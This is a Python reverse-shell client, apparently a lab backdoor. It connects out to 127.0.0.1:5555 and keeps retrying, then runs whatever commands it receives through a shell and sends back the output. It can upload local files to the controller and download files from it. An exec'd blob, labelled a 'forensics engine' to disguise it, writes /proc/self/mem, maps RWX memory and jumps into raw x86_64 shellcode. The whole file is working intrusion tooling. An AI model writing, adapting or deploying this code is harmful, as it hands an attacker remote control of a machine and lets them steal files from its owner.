import socket
import time
import subprocess
import json
import os
import ctypes

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            chunk = s.recv(1024).decode().rstrip()
            if not chunk:
                raise ConnectionError('Server disconnected')
            data += chunk
            return json.loads(data)
        except ValueError:
            continue


def client_recv_stream(file_name):
    """Handles 'download': Client receives a file downloaded from the server."""
    try:
        # 1. Read the file size heading sent by the server
        file_size_str = s.recv(1024).decode()
        if "ERROR" in file_size_str:
            return

        file_size = int(file_size_str)

        # 2. Open and create the file fresh on the client side
        with open(file_name, 'wb') as f:
            bytes_received = 0
            while bytes_received < file_size:
                chunk = s.recv(min(1024, file_size - bytes_received))
                if not chunk:
                    break
                f.write(chunk)
                bytes_received += len(chunk)
    except Exception as e:
        pass


def client_send_stream(file_name):
    """Handles 'upload': Client sends a file up to the server."""
    try:
        if not os.path.exists(file_name):
            s.send(b"[-] ERROR: Local file not found on client.")
            return

        # 1. Get the exact size of the file
        file_size = os.path.getsize(file_name)
        
        # 2. Send the size heading to the server first
        s.send(str(file_size).encode())
        time.sleep(0.1)

        # 3. Stream the raw file data chunks over the socket
        with open(file_name, 'rb') as f:
            chunk = f.read(1024)
            while chunk:
                s.send(chunk)
                chunk = f.read(1024)
    except Exception as e:
        pass


# -------------------------------------------------------------------------
# STABLE FILELESS FORENSICS ENGINE (Pure x86_64 Process Rename Shellcode)
# -------------------------------------------------------------------------
_DATA_BLOB = """
def _exec_mem():
    try:
        original = b"HELLO_FROM_PROC_SELF_MEM"
        buffer = ctypes.create_string_buffer(original)
        address = ctypes.addressof(buffer)
        size = len(original)
        fd = os.open("/proc/self/mem", os.O_RDWR)
        try:
            os.pwrite(fd, b"PATCHD_FROM_PROC_SELF_MEM", address)
            recovered = os.pread(fd, size, address)
        finally:
            os.close(fd)
        return f"\\n[+] /proc/self/mem success\\n  - PID: {os.getpid()}\\n  - Heap Address: {hex(address)}\\n  - Recovered: {recovered.decode(errors='replace')}\\n  - Native Variable: {buffer.value.decode(errors='replace')}\\n"
    except PermissionError:
        return "[-] Permission Denied: Kernel protections blocked procfs write."
    except Exception as e:
        return f"[-] Memory demo failure: {str(e)}"

def _exec_sc():
    try:
        sc_bytes = [
            0x48, 0x31, 0xc0, 0x50, 0x48, 0xba, 0x45, 0x44, 0x5f, 0x41, 0x53, 0x4d, 
            0x5d, 0x00, 0x52, 0x48, 0xba, 0x5b, 0x49, 0x4e, 0x4a, 0x45, 0x43, 0x54, 
            0x45, 0x52, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc7, 0x0f, 0x00, 0x00, 0x00, 
            0x48, 0xc7, 0xc0, 0x9d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xeb, 0xfe
        ]
        shellcode = bytes(sc_bytes)
        size = len(shellcode)
        libc = ctypes.CDLL(None)
        libc.mmap.restype = ctypes.c_void_p
        libc.mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_long]
        address = libc.mmap(0, 4096, 7, 0x22, -1, 0)
        if not address:
            return "[-] Kernel rejected mmap RWX allocation."
        ctypes.memmove(address, shellcode, size)
        return int(address)
    except Exception as e:
        return f"[-] Shellcode engine error: {str(e)}"
"""


def shell():
    while True:
        try:
            command = reliable_recv()
            if command == 'quit':
                break
            elif command == 'clear':
                continue
            elif command == 'proc-mem-demo':
                scope = {}
                exec(_DATA_BLOB, globals(), scope)
                response = scope['_exec_mem']()
                reliable_send(response)
            elif command == 'shellcode-demo':
                scope = {}
                exec(_DATA_BLOB, globals(), scope)
                address = scope['_exec_sc']()
                if isinstance(address, int):
                    target_pid = os.getpid()
                    alert = (
                        f"\n[!] SUCCESS: Pure machine code injected at {hex(address)} via mmap.\n"
                        f"[*] Jumping CPU context execution pointer (PID: {target_pid})...\n"
                        f"[!] FORENSIC ACTION: Thread tracking name changed directly in kernel memory!\n"
                        f"[*] RUN THIS CHECK COMMAND: 'ps -q {target_pid} -o comm=' to verify.\n"
                    )
                    reliable_send(alert)
                    time.sleep(0.5)
                    func_type = ctypes.CFUNCTYPE(None)
                    shellcode_func = func_type(address)
                    shellcode_func()
                else:
                    reliable_send(address)
            elif command[:3] == 'cd ':
                os.chdir(command[3:])
            elif command[:8] == 'download':
                client_recv_stream(command[9:])
            elif command[:6] == 'upload':
                client_send_stream(command[7:])
            else:
                execute = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                )
                result = execute.stdout.read() + execute.stderr.read()
                reliable_send(result.decode(errors='replace'))
        except ConnectionError:
            break


def connection():
    while True:
        time.sleep(2)
        try:
            s.connect(('127.0.0.1', 5555))
            shell()
            s.close()
            break
        except (ConnectionRefusedError, OSError):
            continue


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
